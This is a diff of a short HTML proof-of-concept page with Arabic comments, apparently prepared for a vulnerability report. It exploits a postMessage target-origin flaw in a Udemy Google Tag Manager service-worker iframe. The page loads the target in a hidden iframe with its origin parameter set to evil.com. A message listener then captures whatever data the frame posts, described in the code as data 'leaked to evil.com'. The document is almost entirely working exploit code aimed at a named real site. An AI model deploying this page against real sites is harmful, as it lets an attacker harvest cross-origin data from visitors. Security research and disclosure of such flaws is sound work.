@@ -1,17 +1,33 @@
-<iframe src="https://gtm.udemy.com/_/service_worker/5a20/sw_iframe.html?origin=https%3A%2F%2Fevil.com&1p=1"></iframe>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC for Target Origin Manipulation</title>
+</head>
+<body>
+    <h1>Loading Vulnerable Iframe...</h1>
+    
+    <iframe id="targetFrame" 
+        src="https://gtm.udemy.com/_/service_worker/5a20/sw_iframe.html?origin=https%3A%2F%2Fevil.com&1p=1" 
+        style="width:0; height:0; border:none; visibility:hidden;">
+    </iframe>
 
-<script>
-// الآن، الإطار الأب هو evil.com، وقيمة 'origin' في الـ URL هي evil.com.
-// الفحص: b[0] !== this.origin سيفشل (كلاهما evil.com)، وسيتم تشغيل الدالة D(this).
+    <script>
+        // 3. هذا المستمع هو الذي يلتقط الرسالة المُرسلة من الإطار المستهدف.
+        window.addEventListener('message', (event) => {
+            // تحقق بسيط للتأكد من أن الرسالة تأتي من الموقع المستهدف
+            if (event.origin === "https://gtm.udemy.com") { 
+                
+                // **** النجاح هنا! إذا رأيت هذا التنبيه، فقد نجحت في توجيه البيانات إلى موقعك. ****
+                const receivedData = event.data;
+                console.log("SUCCESS! Data was leaked to evil.com:", receivedData);
+                
+                // يمكنك استخدام alert لتوضيح النجاح في التقرير
+                alert("Vulnerability Confirmed! postMessage Target Origin Controlled by Attacker. Data: " + JSON.stringify(receivedData));
+            }
+        });
 
-// كود للاستماع للرسائل المرسلة من الإطار إلى evil.com (Parent)
-window.addEventListener('message', (event) => {
-    if (event.origin === "https://gtm.udemy.com") {
-        console.log("تم تلقي بيانات حساسة من الموقع المستهدف:", event.data);
-        alert("Vulnerability Confirmed! Data leaked via postMessage to " + event.origin);
-    }
-});
+        console.log("Waiting for message from iframe...");
 
-// يمكنك الآن محاولة إرسال رسالة من evil.com إلى الإطار لتفعيل رد
-document.querySelector('iframe').contentWindow.postMessage('ping', 'https://gtm.udemy.com');
-</script>
+    </script>
+</body>
+</html>
